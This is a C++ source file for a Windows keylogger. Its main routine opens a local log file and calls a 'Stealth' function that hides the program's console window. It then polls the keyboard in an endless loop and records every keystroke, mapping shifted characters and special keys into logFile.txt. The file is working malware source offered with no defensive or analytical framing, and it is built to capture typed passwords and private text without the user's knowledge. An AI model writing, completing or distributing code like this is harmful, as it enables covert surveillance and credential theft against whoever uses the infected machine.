#include "Keylogger.h"

std::string LSHIFT = "SHIFT";
std::string RSHIFT = "SHIFT";
std::string LCTRL = "CTRL";
std::string RCTRL = "CTRL";
std::string LALT = "ALT";
std::string RALT = "ALT";


int main()
{
	// Create a logFile output file stream
	std::ofstream logFile;

	// Set left and right strings for characters
	// by prepending L and R appropriately if
	// we pass true to the following function
	DifferentiateLeftAndRightKeys(false); // Initially false.

	// If we fail to create a log file,
	// gracefully exit the program.
	if (!CreateOrOpenLogFile(logFile))
		return -1;
	
	// Make the program a stealth program, assuming
	// it actually can create a log file.
	Stealth();

	// Log some keys
	Keylog(logFile);
	return 0;
}

// The actual running keylogger method
void Keylog(std::ofstream& logFile)
{
	bool wasKeyPreviouslyDown[256];
	short highOrderBitmask = (short)(1 << 15);
	while (true) 
	{
		for (int i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) & highOrderBitmask)
			{
				if (!wasKeyPreviouslyDown[i])
				{
					wasKeyPreviouslyDown[i] = true;
					Log(i, logFile, GetAsyncKeyState(VK_SHIFT), GetKeyState(VK_CAPITAL));
				}
			}
			else
			{
				wasKeyPreviouslyDown[i] = false;
			}
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(1));
	}
}

// Logs a keystroke
void Log(int keyCode, std::ofstream& logFile, bool shifted, bool capsLockOn)
{
	switch (keyCode)
	{
	case VK_BACK:
		logFile << std::endl << "[^BACKSP]" << std::endl << std::endl;
		break;
	case VK_TAB:
		logFile << std::endl << "[^TAB]" << std::endl;
		break;
	case VK_RETURN:
		logFile << std::endl << "[^ENTER]" << std::endl;
		break;
	case VK_SHIFT:
		// We are capturing left AND right shifts separately.
		// Do nothing.
		break;
	case VK_LSHIFT:
		logFile << std::endl << "[^" << LSHIFT << "]" << std::endl;
		break;
	case VK_RSHIFT:
		logFile << std::endl << "[^" << RSHIFT << "]" << std::endl;
		break;
	case VK_CONTROL:
		// We are capturing left AND right controls separately.
		// Do nothing.
		break;
	case VK_LCONTROL:
		logFile << std::endl << "[^" << LCTRL << "]" << std::endl;
		break;
	case VK_RCONTROL:
		logFile << std::endl << "[^" << RCTRL << "]" << std::endl;
		break;
	case VK_MENU:
		// We are capturing left AND right alts separately.
		// Do nothing.
		break;
	case VK_LMENU:
		logFile << std::endl << "[^" << LALT << "]" << std::endl;
		break;
	case VK_RMENU:
		logFile << std::endl << "[^" << RALT << "]" << std::endl;
		break;
	case VK_PAUSE:
		logFile << std::endl << "[^PAUSE]" << std::endl;
		break;
	case VK_CAPITAL:
		logFile << std::endl << "[^CAPS]" << std::endl;
		break;
	case VK_ESCAPE:
		logFile << std::endl << "[^ESC]" << std::endl;
		break;
	case VK_SPACE:
		logFile << " ";
		break;
	case VK_PRIOR:
		logFile << std::endl << "[^PGUP]" << std::endl;
		break;
	case VK_NEXT:
		logFile << std::endl << "[^PGDN]" << std::endl;
		break;
	case VK_END:
		logFile << std::endl << "[^END]" << std::endl;
		break;
	case VK_HOME:
		logFile << std::endl << "[^HOME]" << std::endl;
		break;
	case VK_LEFT:
		logFile << std::endl << "[^LEFT]" << std::endl;
		break;
	case VK_UP:
		logFile << std::endl << "[^UP]" << std::endl;
		break;
	case VK_RIGHT:
		logFile << std::endl << "[^RIGHT]" << std::endl;
		break;
	case VK_DOWN:
		logFile << std::endl << "[^DOWN]" << std::endl;
		break;
	case VK_SELECT: // ???
		logFile << std::endl << "[^SELECT]" << std::endl;
		break;
	case VK_PRINT: // Again, ???
		logFile << std::endl << "[^PRINTKEY]" << std::endl;
		break;
	case VK_EXECUTE: // ...again... ???
		logFile << std::endl << "[^EXECUTE]" << std::endl;
		break;
	case VK_SNAPSHOT:
		logFile << std::endl << "[^PRINTSCR]" << std::endl;
		break;
	case VK_INSERT:
		logFile << std::endl << "[^INS]" << std::endl;
		break;
	case VK_DELETE:
		logFile << std::endl << "[^DEL]" << std::endl;
		break;
	case VK_HELP:
		logFile << std::endl << "[^HELP]" << std::endl;
		break;
	
	// 0-9
	case 0x30:
		if (shifted)
			logFile << ")";
		else
			logFile << "0";
		break;
	case 0x31:
		if (shifted)
			logFile << "!";
		else
			logFile << "1";
		break;
	case 0x32:
		if (shifted)
			logFile << "@";
		else
			logFile << "2";
		break;
	case 0x33:
		if (shifted)
			logFile << "#";
		else
			logFile << "3";
		break;
	case 0x34:
		if (shifted)
			logFile << "$";
		else
			logFile << "4";
		break;
	case 0x35:
		if (shifted)
			logFile << "%";
		else
			logFile << "5";
		break;
	case 0x36:
		if (shifted)
			logFile << "^";
		else
			logFile << "6";
		break;
	case 0x37:
		if (shifted)
			logFile << "&";
		else
			logFile << "7";
		break;
	case 0x38:
		if (shifted)
			logFile << "*";
		else
			logFile << "8";
		break;
	case 0x39:
		if (shifted)
			logFile << "(";
		else
			logFile << "9";
		break;
	case VK_MULTIPLY:
		logFile << "*";
		break;
	case VK_OEM_1: // ; :
		if (shifted)
			logFile << ":";
		else
			logFile << ";";
		break;
	case VK_OEM_2:
		if (shifted)
			logFile << "?";
		else
			logFile << "/";
		break;
	case VK_OEM_3:
		if (shifted)
			logFile << "~";
		else
			logFile << "`";
		break;
	case VK_OEM_4:
		if (shifted)
			logFile << "{";
		else
			logFile << "[";
		break;
	case VK_OEM_5:
		if (shifted)
			logFile << "|";
		else
			logFile << "\\";
		break;
	case VK_OEM_6:
		if (shifted)
			logFile << "}";
		else
			logFile << "]";
		break;
	case VK_OEM_7:
		if (shifted)
			logFile << "\"";
		else
			logFile << "'";
		break;
	case VK_OEM_COMMA:
		if (shifted)
			logFile << "<";
		else
			logFile << ",";
		break;
	case VK_OEM_PERIOD:
		if (shifted)
			logFile << ">";
		else
			logFile << ".";
		break;
	case VK_OEM_MINUS:
		if (shifted)
			logFile << "_";
		else
			logFile << "-";
		break;
	case VK_OEM_PLUS:
		if (shifted)
			logFile << "+";
		else
			logFile << "=";
		break;
	default:
		char c = (char)keyCode;
		if (keyCode >= 65 && keyCode <= 90)
		{
			if (capsLockOn)
			{
				if (!shifted)
				{
					logFile << c;
				}
				else
				{
					logFile << ((char)(c + 32));
				}
			}
			else
			{
				if (!shifted)
				{
					logFile << ((char)(c + 32));
				}
				else
				{
					logFile << c;
				}
			}
			break;
		}
		else if (keyCode >= 0x70 && keyCode <= 0x87) // F-keys
		{
			logFile << std::endl << "[^F" << keyCode - 0x6F << "]";
			break;
		}
		logFile << std::endl << "[^KEYCODE" << keyCode << "]";
		break;
	}

}

// Opens (or creates and opens) a log file
bool CreateOrOpenLogFile(std::ofstream& logFile)
{
	try
	{
		logFile.open("logFile.txt", std::ofstream::app);
	}
	catch (int e)
	{
		return false;
	}

	return true;
}


// Prepend L & R appropriately if we pass true
// to this method.
void DifferentiateLeftAndRightKeys(bool leftAndRightAreDistinct)
{
	if (leftAndRightAreDistinct)
	{
		LSHIFT = "L" + LSHIFT;
		RSHIFT = "R" + RSHIFT;
		LCTRL = "L" + LCTRL;
		RCTRL = "R" + RCTRL;
		LALT = "L" + LALT;
		RALT = "R" + RALT;
	}
}

/******************************************************\
* Create a hidden window. V stealth
* Credit for this method goes 
* to COMSATS from cplusplus.com
* forums.
* Link: http://www.cplusplus.com/forum/lounge/27569/
\******************************************************/
void Stealth()
{
	// Create a Window Handle 
	HWND stealth;
	
	// Allocate a console for the application and provide
	// it stdin/stdout/stderr handles
	AllocConsole(); 

	// Retrieve the Windows Handle for the current application
	// (assuming another Windows application which so happens
	// to have the lpszClassName "ConsoleWindowClass" doesn't
	// get found first)
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	
	// Hide the window
	ShowWindow(stealth, 0);
}